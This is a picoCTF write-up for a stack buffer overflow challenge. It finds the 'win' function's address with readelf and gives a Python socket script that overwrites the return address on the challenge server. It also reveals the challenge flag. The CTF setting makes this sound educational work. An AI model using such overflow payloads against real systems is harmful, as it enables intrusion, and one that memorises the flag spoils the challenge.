<ol>
    <li>
    We get "vuln.c" and "vuln"

    $ wget https://artifacts.picoctf.net/c/250/vuln; https://artifacts.picoctf.net/c/250/vuln.c
</li>
<br/>
    <li>
    Reading through "vuln.c" I noticed the function that prints the flag is the "win" function, but yet it's not called during the execution of "vuln".
</li>
<br/>
    <li>
    Also the "vuln" funtion uses the dangerous "gets" to get the input, and since it's the only thing it does besides the print below, we can cause a buffer overflow to change it's return address.
</li>
<br/>
    <li>
    For us to be able to direct the return address to "win"s, we need to know it's adress. We can do that by using the program "readelf" on "vuln" (watch out because the address comes in little endian, we need to swap it's endianness): 
</li>

```bash

$ readelf -s ./vuln

> Num:    Value  Size Type    Bind   Vis      Ndx Name
  ...
  63: 080491f6   139 FUNC    GLOBAL DEFAULT   13 win
  ...

```
<br/>
<li>
Now we just need to overflow the buffer with "win"s return address:

```python
import socket

payload = b"A"*44 + b"\xf6\x91\x04\x08" + b"\n"

with socket.socket() as connection:

    connection.connect(("saturn.picoctf.net",56104))
    connection.recv(4096).decode("utf-8")
    connection.send(payload)
    text, flag = connection.recv(4096).decode("utf-8").split("\n")
    print(flag)

```

</li>
<br/>
<details>
    <summary> Flag </summary>
    
    picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
</details>

</ol>